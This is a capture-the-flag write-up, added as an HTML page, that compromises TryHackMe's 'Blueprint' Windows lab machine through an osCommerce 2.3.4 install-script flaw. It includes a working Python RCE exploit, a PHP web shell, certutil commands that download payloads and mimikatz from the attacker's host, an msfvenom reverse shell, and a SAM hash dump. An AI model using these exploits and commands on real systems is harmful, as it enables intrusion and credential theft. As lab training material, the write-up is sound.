@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/assets/css/style.css" />
+        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
+        <title>Blueprint - pwnerguy's shell stuff</title>
+        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
+        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
+        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
+        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
+        <!-- SEO -->
+        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
+        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
+        <meta name="author" content="pwnerguy" />
+        <meta name="robots" content="index, follow" />
+    </head>
+    <body>
+        <header>
+            <a href="/" class="logo">pwnerguy's shell stuff</a>
+            <nav>
+                <a href="/writeups">Writeups</a>
+                <a href="/cheatsheets">Cheat Sheets</a>
+            </nav>
+        </header>
+        <main>
+            
+        <a href="/writeups" class="back-link">← Go back</a>
+        <section class="writeup-content">
+            <h1>Blueprint</h1>
+<div class="writeup-tags"><span class="tag tag-tryhackme">TryHackMe</span> <span class="tag tag-easy">Easy</span> <span class="tag tag-windows">Windows</span> <span class="tag tag-rce">RCE</span> <span class="tag tag-oscommerce-2.3.4-rce">oscommerce-2.3.4 RCE</span> <span class="tag tag-file-upload">File Upload</span></div>
+<hr>
+<h2>Introduction</h2>
+<p>This writeup documents the penetration testing of the <a href="https://tryhackme.com/room/blueprint"><strong>Blueprint</strong></a> machine from the <a href="https://tryhackme.com/"><strong>TryHackMe</strong></a> platform. In this ocasion, I&#39;ll exploit a vulnerable e-commerce platform called osEcommerce through a LFI vulnerability.</p>
+<hr>
+<h2>Information Gathering</h2>
+<p>After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
+<ul>
+<li>TTL 64: Linux.</li>
+<li>TTL 128: Windows.</li>
+</ul>
+<pre><code>❯ ping -c 1 10.10.91.114
+PING 10.10.91.114 (10.10.91.114) 56(84) bytes of data.
+64 bytes from 10.10.91.114: icmp_seq=1 ttl=127 time=218 ms
+
+--- 10.10.91.114 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 218.135/218.135/218.135/0.000 ms
+</code></pre>
+<p>In this case, the target seems to be a Windows machine. Let&#39;s perform some scans.</p>
+<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.91.114 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 21:02 CET
+Initiating SYN Stealth Scan at 21:02
+Scanning 10.10.91.114 [65535 ports]
+Discovered open port 443/tcp on 10.10.91.114
+Discovered open port 3306/tcp on 10.10.91.114
+Discovered open port 135/tcp on 10.10.91.114
+Discovered open port 139/tcp on 10.10.91.114
+Discovered open port 445/tcp on 10.10.91.114
+Discovered open port 80/tcp on 10.10.91.114
+Discovered open port 8080/tcp on 10.10.91.114
+Discovered open port 49160/tcp on 10.10.91.114
+Discovered open port 49160/tcp on 10.10.91.114
+Discovered open port 49153/tcp on 10.10.91.114
+Discovered open port 49153/tcp on 10.10.91.114
+Discovered open port 49158/tcp on 10.10.91.114
+Discovered open port 49158/tcp on 10.10.91.114
+Discovered open port 49154/tcp on 10.10.91.114
+Discovered open port 49159/tcp on 10.10.91.114
+Discovered open port 49152/tcp on 10.10.91.114
+Completed SYN Stealth Scan at 21:03, 49.04s elapsed (65535 total ports)
+Nmap scan report for 10.10.91.114
+Host is up, received user-set (0.12s latency).
+Scanned at 2025-11-10 21:02:38 CET for 49s
+Not shown: 46479 filtered tcp ports (no-response), 19043 closed tcp ports (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE      REASON
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+443/tcp   open  https        syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+3306/tcp  open  mysql        syn-ack ttl 127
+8080/tcp  open  http-proxy   syn-ack ttl 127
+49152/tcp open  unknown      syn-ack ttl 127
+49153/tcp open  unknown      syn-ack ttl 127
+49154/tcp open  unknown      syn-ack ttl 127
+49158/tcp open  unknown      syn-ack ttl 127
+49159/tcp open  unknown      syn-ack ttl 127
+49160/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 49.15 seconds
+           Raw packets sent: 242563 (10.673MB) | Rcvd: 20178 (807.192KB)
+</code></pre>
+<pre><code>❯ nmap -sCV -p80,135,139,443,445,3306,8080,49152,49153,49154,49158,49159,49160 10.10.91.114 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 21:04 CET
+Nmap scan report for 10.10.91.114
+Host is up (0.16s latency).
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: 404 - File or directory not found.
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Bad request!
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
+8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| -     2019-04-11 22:52  oscommerce-2.3.4/
+| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
+| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
+|_
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+|_http-title: Index of /
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 1s, median: -2s
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-11-10T20:05:20
+|_  start_date: 2025-11-10T19:55:26
+| smb-os-discovery: 
+|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: BLUEPRINT
+|   NetBIOS computer name: BLUEPRINT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-11-10T20:05:19+00:00
+|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:b0:1f:aa:21:2f (unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 76.95 seconds
+</code></pre>
+<p>Nmap found some open ports, and we can determinate some things:</p>
+<ul>
+<li>It&#39;s a Windows 7 Home Basic machine named BLUEPRINT and it&#39;s in a workgroup.</li>
+<li>3 web servers, port 445 and 139 open...</li>
+</ul>
+<pre><code>❯ whatweb http://10.10.91.114
+http://10.10.91.114 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.91.114], Microsoft-IIS[7.5], Title[404 - File or directory not found.]
+</code></pre>
+<p><img src="/assets/images/blueprint/web1.png" alt=""></p>
+<p>Nothing interesting in the web, source code or directory and file fuzzing.</p>
+<p>Let&#39;s enumerate now the port 443.</p>
+<pre><code>❯ whatweb https://10.10.91.114
+https://10.10.91.114 [200 OK] Apache[2.4.23], Country[RESERVED][ZZ], HTTPServer[Windows (32 bit)][Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28], IP[10.10.91.114], Index-Of, OpenSSL[1.0.2h], PHP[5.6.28], Title[Index of /]
+</code></pre>
+<p><img src="/assets/images/blueprint/web3.png" alt=""></p>
+<p>Nothing interesting too.</p>
+<p>Now, let&#39;s enumerate the port 8080.</p>
+<pre><code>whatweb http://10.10.91.114:8080
+http://10.10.91.114:8080 [200 OK] Apache[2.4.23], Country[RESERVED][ZZ], HTTPServer[Windows (32 bit)][Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28], IP[10.10.91.114], Index-Of, OpenSSL[1.0.2h], PHP[5.6.28], Title[Index of /]
+</code></pre>
+<p><img src="/assets/images/blueprint/web2.png" alt=""></p>
+<p>This web server is running <strong>oscommerce-2.3.4</strong> as nmap specified before. This is way too specific. Let&#39;s fuzz some directories and files with <strong>Gobuster</strong>.</p>
+<blockquote>
+<p>osCommerce is a free, open-source e-commerce platform that provides tools for creating and managing online stores. The platform is built on PHP and MySQL.</p>
+</blockquote>
+<pre><code>❯ gobuster dir -u http://10.10.91.114:8080/oscommerce-2.3.4/catalog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20 -x txt,php,html
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.91.114:8080/oscommerce-2.3.4/catalog/
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              txt,php,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 370] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/images/]
+/download             (Status: 401) [Size: 1320]
+/download.php         (Status: 200) [Size: 0]
+/index.php            (Status: 200) [Size: 15612]
+/privacy.php          (Status: 200) [Size: 11293]
+/login.php            (Status: 200) [Size: 13387]
+/pub                  (Status: 301) [Size: 367] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/pub/]
+/reviews.php          (Status: 200) [Size: 12278]
+/Images               (Status: 301) [Size: 370] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/Images/]
+/admin                (Status: 301) [Size: 369] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/admin/]
+/contact_us.php       (Status: 200) [Size: 12004]
+/account.php          (Status: 302) [Size: 0] [--&gt; http://localhost:8080/oscommerce-2.3.4/catalog/login.php?osCsid=4vgn7qb63qenj2do853b35i8o2]
+/redirect.php         (Status: 302) [Size: 0] [--&gt; http://localhost:8080/oscommerce-2.3.4/catalog/index.php?osCsid=ntcq4mfl9uqrpdqr0fk5ghhf15]
+/specials.php         (Status: 200) [Size: 13437]
+/includes             (Status: 301) [Size: 372] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/includes/]
+/Privacy.php          (Status: 200) [Size: 11381]
+/Index.php            (Status: 200) [Size: 15634]
+/install              (Status: 301) [Size: 371] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/install/]
+/Download             (Status: 401) [Size: 1320]
+/Login.php            (Status: 200) [Size: 13380]
+/Download.php         (Status: 200) [Size: 0]
+/advanced_search.php  (Status: 200) [Size: 18785]
+/product_info.php     (Status: 302) [Size: 0] [--&gt; http://localhost:8080/oscommerce-2.3.4/catalog/index.php?osCsid=cj1tp194mkvr3bd714k9iu4fp5]
+/Reviews.php          (Status: 200) [Size: 12256]
+/shopping_cart.php    (Status: 200) [Size: 11330]
+/shipping.php         (Status: 200) [Size: 11461]
+/ext                  (Status: 301) [Size: 367] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/ext/]
+/conditions.php       (Status: 200) [Size: 11359]
+/INSTALL              (Status: 301) [Size: 371] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/INSTALL/]
+/Contact_Us.php       (Status: 200) [Size: 12039]
+/IMAGES               (Status: 301) [Size: 370] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/IMAGES/]
+/checkout_shipping.php (Status: 302) [Size: 0] [--&gt; http://localhost:8080/oscommerce-2.3.4/catalog/login.php?osCsid=17pi6s1kmthd13i7hasb5csq74]
+/INDEX.php            (Status: 200) [Size: 15636]
+/Account.php          (Status: 302) [Size: 0] [--&gt; http://localhost:8080/oscommerce-2.3.4/catalog/login.php?osCsid=rprp65ql86tob3arhigjv0kg86]
+/Admin                (Status: 301) [Size: 369] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/Admin/]
+/create_account.php   (Status: 200) [Size: 29261]
+/products_new.php     (Status: 200) [Size: 22586]
+/Redirect.php         (Status: 302) [Size: 0] [--&gt; http://localhost:8080/oscommerce-2.3.4/catalog/index.php?osCsid=i0fos6in18fav3ke71k3idupe1]
+/*checkout*           (Status: 403) [Size: 1045]
+/*checkout*.txt       (Status: 403) [Size: 1045]
+/*checkout*.php       (Status: 403) [Size: 1045]
+/*checkout*.html      (Status: 403) [Size: 1045]
+/SPECIALS.php         (Status: 200) [Size: 13494]
+/Install              (Status: 301) [Size: 371] [--&gt; http://10.10.91.114:8080/oscommerce-2.3.4/catalog/Install/]
+/product_reviews.php  (Status: 302) [Size: 0] [--&gt; http://localhost:8080/oscommerce-2.3.4/catalog/reviews.php?osCsid=88nnj80v73qskcida9adco7jn2]
+/Specials.php         (Status: 200) [Size: 13459]
+...
+</code></pre>
+<hr>
+<h2>Vulnerability Assessment</h2>
+<pre><code>❯ searchsploit oscommerce 2.3.4
+-------------------------------------------------------------------------------------------------------------
+ Exploit Title                                                                        |  Path
+-------------------------------------------------------------------------------------------------------------
+osCommerce 2.3.4 - Multiple Vulnerabilities                                           | php/webapps/34582.txt
+osCommerce 2.3.4.1 - &#39;currency&#39; SQL Injection                                         | php/webapps/46328.txt
+osCommerce 2.3.4.1 - &#39;products_id&#39; SQL Injection                                      | php/webapps/46329.txt
+osCommerce 2.3.4.1 - &#39;reviews_id&#39; SQL Injection                                       | php/webapps/46330.txt
+osCommerce 2.3.4.1 - &#39;title&#39; Persistent Cross-Site Scripting                          | php/webapps/49103.txt
+osCommerce 2.3.4.1 - Arbitrary File Upload                                            | php/webapps/43191.py
+osCommerce 2.3.4.1 - Remote Code Execution                                            | php/webapps/44374.py
+osCommerce 2.3.4.1 - Remote Code Execution (2)                                        | php/webapps/50128.py
+--------------------------------------------------------------------------------------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>I&#39;ll be testing this script: <code>php/webapps/44374.py</code></p>
+<pre><code class="language-bash"># If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
+# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
+# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
+# execute the &quot;install_4.php&quot; script, which will create the config file for the installation. It is possible to inject
+# PHP code into the config file and then simply executing the code by opening it.
+</code></pre>
+<p>Gobuster reported the <code>install/</code> directory, so we&#39;re fine with that.</p>
+<hr>
+<h2>Exploitation</h2>
+<p>Now I&#39;ll create a maicious php file named <code>shell.php</code> with this code.</p>
+<pre><code class="language-php">&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;
+</code></pre>
+<p>Don&#39;t forget to edit the python script:</p>
+<pre><code class="language-python">import requests
+
+# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
+base_url = &quot;http://10.10.91.114:8080/oscommerce-2.3.4/catalog/&quot;
+target_url = &quot;http://10.10.91.114:8080/oscommerce-2.3.4/catalog/install/install.php?step=4&quot;
+
+data = {
+    &#39;DIR_FS_DOCUMENT_ROOT&#39;: &#39;./&#39;
+}
+
+# the payload will be injected into the configuration file via this code
+# &#39;  define(\&#39;DB_DATABASE\&#39;, \&#39;&#39; . trim($HTTP_POST_VARS[&#39;DB_DATABASE&#39;]) . &#39;\&#39;);&#39; . &quot;\n&quot; .
+# so the format for the exploit will be: &#39;); PAYLOAD; /*
+
+payload = &#39;\&#39;);&#39;
+# our php payload
+payload += &#39;$var = shell_exec(&quot;cmd.exe /C certutil -urlcache -split -f http://10.8.78.182:8080/shell.php shell.php &amp; nslookup test 10.8.78.182 &quot;);&#39;
+payload += &#39;echo $var;&#39;
+payload += &#39;/*&#39;
+
+data[&#39;DB_DATABASE&#39;] = payload
+
+# exploit it
+r = requests.post(url=target_url, data=data)
+
+if r.status_code == 200:
+    print(&quot;[+] Successfully launched the exploit. Open the following URL to execute your code\n\n&quot; + base_url + &quot;install/includes/configure.php&quot;)
+else:
+    print(&quot;[-] Exploit did not execute as planned&quot;)
+</code></pre>
+<p>Then, I&#39;ll start a python web server on the port 8080 and run the exploit.</p>
+<pre><code>❯ python3 -m http.server 8080
+❯ python 44374
+[+] Successfully launched the exploit. Open the following URL to execute your code
+
+http://10.10.91.114:8080/oscommerce-2.3.4/catalog/install/includes/configure.php
+</code></pre>
+<p>I&#39;ll run <code>configure.php</code> and then run <code>shell.php</code> with the <em>cmd</em> parameter to test if the everything is OK.</p>
+<p><img src="/assets/images/blueprint/includes.png" alt=""></p>
+<p><img src="/assets/images/blueprint/whoami.png" alt=""></p>
+<hr>
+<h2>Post-Exploitation</h2>
+<p>We need to get an interactive shell session. I&#39;ll use <code>msfvenom</code>.</p>
+<pre><code>❯ msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.8.78.182 LPORT=4444 -f exe -o rev.exe
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev.exe
+</code></pre>
+<p>Then, I&#39;ll change the path on the python exploit to point the reverse shell binary I created in my machine just a moment ago.</p>
+<pre><code class="language-python">...
+# our php payload
+payload += &#39;$var = shell_exec(&quot;cmd.exe /C certutil -urlcache -split -f http://10.8.78.182:8080/rev.exe rev.exe &amp; nslookup test 10.8.78.182 &quot;);&#39;
+payload += &#39;echo $var;&#39;
+payload += &#39;/*&#39;
+...
+</code></pre>
+<p>After running the exploit I&#39;ll execute <code>configure.php</code> and the reverse shell binary is uploaded and ready.</p>
+<p><img src="/assets/images/blueprint/rev.png" alt=""></p>
+<p>Now, execute <code>shell.php?cmd=rev.exe</code> while you&#39;re listening on the selected port to get the reverse shell.</p>
+<pre><code>❯ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.8.78.182] from (UNKNOWN) [10.10.91.114] 49513
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes&gt;whoami
+nt authority\system
+</code></pre>
+<p>We need to find all the flags. The root flag is in Administrator&#39;s desktop.</p>
+<pre><code>C:\Users\Administrator\Desktop&gt;type root.txt.txt
+***REDACTED***
+</code></pre>
+<p>And finally, let&#39;s find the &quot;Lab&quot; user NTLM hash. It&#39;s a 32 bits Windows machine, so I&#39;ll downlad mimikatz for that arquitecture and then download it from the machine, execute it and dump it.</p>
+<pre><code>systeminfo
+certutil.exe -urlcache -f http://10.8.78.182:8080/mimikatz.exe mimikatz.exe
+mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10
+ .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # lsadump::sam
+...
+RID  : 000003e8 (1000)
+User : Lab
+  Hash NTLM: ***REDACTED***
+</code></pre>
+<p>To crack the hash you can use any online tool.</p>
+<p><img src="/assets/images/blueprint/hash.png" alt=""></p>
+
+        </section>
+    
+        </main>
+        <footer>
+            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
+            <div class="icons">
+                <a href="mailto:rmp.it@proton.me" target="_blank"">
+                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
+                </a>
+                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
+                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
+                </a>
+                <a href="https://github.com/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
+                </a>
+                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
+                </a>
+                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
+                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
+                </a>
+            </div>
+        </footer>
+        <script>
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const q = searchInput.value.toLowerCase();
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`;
+            //             if (haystack.includes(q)) {
+            //                 card.classList.remove("hidden");
+            //             } else {
+            //                 card.classList.add("hidden");
+            //             }
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll('a[href^="http"]').forEach(a => {
+                a.setAttribute("target", "_blank");
+                a.setAttribute("rel", "noopener noreferrer");
+            });
+            });
+
+            // document.addEventListener("DOMContentLoaded", () => {
